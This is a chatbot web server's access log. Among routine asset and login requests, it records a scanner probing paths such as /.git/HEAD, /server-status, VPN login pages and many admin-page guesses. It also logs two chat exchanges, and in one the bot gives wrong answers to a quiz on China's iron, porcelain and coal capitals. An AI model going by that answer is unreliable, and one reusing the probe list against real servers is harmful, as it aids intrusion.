+INFO:     220.196.160.151:18074 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.51:52412 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:38262 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6590 - "GET / HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6590 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6591 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6587 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6588 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6589 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:6588 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30654 - "GET / HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30654 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30653 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30651 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30652 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30650 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30653 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30652 - "GET /assets/Divider.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30653 - "GET /assets/Login.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30651 - "GET /assets/Page.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30654 - "GET /assets/Text.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30650 - "GET /assets/Labeled.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30649 - "GET /assets/Checkbox.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30651 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30648 - "POST /v1/login/password HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30646 - "GET /assets/MarkdownRender.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30642 - "GET /assets/PresetsButton.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30643 - "GET /assets/ToolTipButton.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30645 - "GET /assets/%40primer/octicons-react.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30647 - "GET /assets/Chat.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30644 - "GET /assets/index2.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30643 - "GET /assets/Slider.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30645 - "GET /assets/Dropdown.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:30647 - "GET /assets/DialogButton.js HTTP/1.1" 200 OK
+INFO:     220.248.226.228:9023 - "POST /v1/chat/completions HTTP/1.1" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-04 09:03:31.121346
+你是谁？
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+我是陆小兮，是一个基于类脑大模型的聊天机器人，由陆兮科技开发。
+response:
+filtered_response:
+INFO:     114.132.203.195:39890 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     59.36.125.102:45134 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.192:43408 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.192:36184 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.192:36202 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.192:36226 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     14.155.62.23:21188 - "GET / HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21188 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21187 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21187 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21188 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21190 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21331 - "GET / HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21331 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21340 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21331 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21340 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21366 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21331 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21366 - "GET /assets/Divider.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21340 - "GET /assets/Page.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21331 - "GET /assets/Login.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21455 - "GET /assets/Checkbox.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21456 - "GET /assets/Text.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21366 - "GET /assets/Login.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21457 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21340 - "GET /assets/Labeled.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:21331 - "GET /assets/Text.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:17622 - "POST /v1/send_verification_code HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18042 - "POST /v1/login/phone HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18042 - "GET /assets/Chat.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18094 - "GET /assets/PresetsButton.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18091 - "GET /assets/index2.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18042 - "GET /assets/Chat.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18092 - "GET /assets/MarkdownRender.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18093 - "GET /assets/ToolTipButton.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18089 - "GET /assets/%40primer/octicons-react.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18091 - "GET /assets/Dropdown.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18042 - "GET /assets/Slider.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18089 - "GET /assets/DialogButton.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18093 - "GET /assets/MarkdownRender.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18094 - "GET /assets/ToolTipButton.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18091 - "GET /assets/PresetsButton.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18089 - "GET /assets/DialogButton.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18042 - "GET /assets/Dropdown.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18094 - "GET /assets/Slider.js HTTP/1.1" 200 OK
+INFO:     14.155.62.23:18414 - "POST /v1/chat/completions HTTP/1.1" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-07-04 11:56:29.773421
+中国的铁都是__，中国的花都是__，中国的瓷都是__，中国的煤都是__
+中国的铁都是钢铁，中国的花都是牡丹，中国的瓷都是瓷器，中国的煤都是煤炭。
+中国的铁都是钢铁，中国的花都是牡丹，中国的瓷都是瓷器，中国的煤都是煤炭。
+response:
+filtered_response:
+INFO:     220.196.160.151:32874 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.61:52296 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.211.44:6291 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     175.24.214.104:43923 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:44998 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.65:44998 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:53860 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.53:33258 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:25472 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:51784 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:25470 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.154:53860 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:17228 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.95:31146 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:33076 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:17234 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     159.75.198.6:59632 - "GET / HTTP/1.1" 200 OK
+INFO:     159.75.198.113:15992 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.247:21220 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.35.33:40325 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:52736 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.51:52736 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:28830 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:58252 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:52772 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.61:49376 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     13.64.111.114:43788 - "GET / HTTP/1.1" 200 OK
+INFO:     223.104.68.92:33244 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.245.251:47326 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.211.44:15545 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:49524 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:1517 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:54778 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.65:54778 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:58366 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:36320 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:54128 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.125:25126 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:48080 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.53:48080 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:53466 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.101:18816 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:48130 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:34448 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     223.113.128.202:53446 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.48:44406 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.48:52518 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.48:52526 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.48:59028 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     180.101.244.15:21314 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.27.58:45665 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:48034 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.146:48034 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:19812 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.151:21466 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:33550 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:30016 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     159.75.198.6:13136 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.245.27:27167 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.144:43120 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.25.245:22601 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:45940 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.84:45940 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:50132 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.65:36678 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:30660 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:21040 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:44074 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:45964 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:18048 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.51:18048 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:16576 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.96:44226 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:32754 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:42532 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     47.113.220.66:52518 - "GET / HTTP/1.0" 200 OK
+INFO:     47.113.220.66:46606 - "GET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0" 404 Not Found
+INFO:     47.113.220.66:46626 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     47.113.220.66:46630 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     47.113.220.66:46762 - "GET /crR5 HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46748 - "GET / HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46790 - "POST /sdk HTTP/1.1" 405 Method Not Allowed
+INFO:     47.113.220.66:46832 - "GET /Portal/Portal.mwsl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46818 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46770 - "GET /CSS/Miniweb.css HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46806 - "GET /nmaplowercheck1720198698 HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46744 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46758 - "GET /webui HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46728 - "GET /base.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46720 - "GET /Portal0000.htm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46750 - "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46866 - "GET /webui HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46844 - "GET /__Additional HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46854 - "GET /default.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46870 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46860 - "GET /user HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46876 - "GET /docs/cplugError.html/ HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46882 - "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46896 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46906 - "GET / HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46892 - "GET /user HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46884 - "GET /home.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46912 - "GET / HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46924 - "GET / HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46932 - "GET /human.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46926 - "GET /base.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46948 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46964 - "GET /human.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46962 - "GET /menu.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46968 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46982 - "GET /inicio.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:46988 - "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47006 - "GET /dana-na/nc/nc_gina_ver.txt HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47000 - "GET /index.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47014 - "GET /start.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47028 - "GET /%2BCSCOE%2B/logon.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47034 - "GET /inicio.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47040 - "GET /CFIDE/componentutils/ HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47054 - "GET /start.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47068 - "GET /default.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47078 - "GET /localstart.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47082 - "GET /localstart.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47096 - "GET /main.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47110 - "GET /start.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47122 - "GET /admin.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47134 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47148 - "GET /menu.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:47160 - "GET /admin.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44784 - "GET /start.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44796 - "GET /base.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44808 - "GET /admin.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44824 - "GET /admin.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44826 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44836 - "GET /menu.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44846 - "GET /indice.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44856 - "GET /admin.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44872 - "GET /admin.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44888 - "GET /home.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44894 - "GET /indice.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44896 - "GET /admin.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44900 - "GET /indice.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44904 - "GET /base.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44910 - "GET /index.html HTTP/1.1" 200 OK
+INFO:     47.113.220.66:46780 - "GET / HTTP/1.1" 200 OK
+INFO:     47.113.220.66:44920 - "GET /menu.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44928 - "GET /base.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44936 - "GET /main.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44950 - "GET /menu.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44958 - "GET /inicio.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44970 - "GET /admin.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44980 - "GET /base.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44992 - "GET /inicio.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:44998 - "GET /default.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45010 - "GET /inicio.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45020 - "GET /inicio.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45024 - "GET /main.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45026 - "GET /base.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45028 - "GET /base.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45042 - "GET /main.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45046 - "GET /home.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45062 - "GET /localstart.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45070 - "GET /default.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45072 - "GET /index.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45082 - "GET /indice.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45098 - "GET /indice.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45112 - "GET /index.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45122 - "GET /inicio.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45138 - "GET /home.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45140 - "GET /index.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45142 - "GET /index.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45148 - "GET /menu.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45154 - "GET /indice.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45156 - "GET /main.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45160 - "GET /indice.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45164 - "GET /start.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45180 - "GET /index.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45186 - "GET /default.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45192 - "GET /home.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45210 - "GET /default.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45228 - "GET /start.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45232 - "GET /indice.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45240 - "GET /menu.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45242 - "GET /readme.txt HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45256 - "GET /inicio.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45270 - "GET /default.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45278 - "GET /main.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45280 - "GET /indice.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45282 - "GET /start.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45288 - "GET /base.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45296 - "GET /localstart.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45308 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45314 - "GET /base.inc HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45318 - "GET /inicio.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45330 - "GET /menu.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45334 - "GET /inicio.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45344 - "GET /index.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45348 - "GET /menu.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45350 - "GET /main.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45364 - "GET /menu.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45374 - "GET /base.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45386 - "GET /inicio.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45390 - "GET /main.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45396 - "GET /localstart.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45410 - "GET /localstart.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45418 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45424 - "GET /localstart.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45440 - "GET /localstart.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45452 - "GET /indice.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45458 - "GET /localstart.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:45462 - "GET /home.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48328 - "GET /start.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48344 - "GET /start.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48356 - "GET /indice.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48364 - "GET /default.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48378 - "GET /main.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48394 - "GET /default.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48408 - "GET /start.jsa HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48418 - "GET /admin.shtml HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48428 - "GET /default.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48438 - "GET /localstart.aspx HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48448 - "GET /home.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48454 - "GET /main.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48458 - "GET /admin.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48464 - "GET /home.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48470 - "GET /main.cgi HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48472 - "GET /default.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48478 - "GET /index.php HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48482 - "GET /localstart.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48486 - "GET /base.jsp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48502 - "GET /home.pl HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48510 - "GET /menu.html HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48526 - "GET /home.asp HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48532 - "GET /home.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48536 - "GET /start.cfm HTTP/1.1" 404 Not Found
+INFO:     47.113.220.66:48542 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.84:43028 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:8137 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:43290 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.84:43290 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:55568 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:58908 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.144:31558 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:25654 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:36382 - "GET /webui HTTP/1.1" 404 Not Found
+INFO:     59.83.208.105:51400 - "GET /home.pl HTTP/1.1" 404 Not Found
+INFO:     220.196.160.144:20822 - "GET /inicio.jhtml HTTP/1.1" 404 Not Found
+INFO:     180.101.245.248:48352 - "GET /menu.aspx HTTP/1.1" 404 Not Found
+INFO:     220.196.160.101:41970 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     59.83.208.103:60436 - "GET /index.shtml HTTP/1.1" 404 Not Found
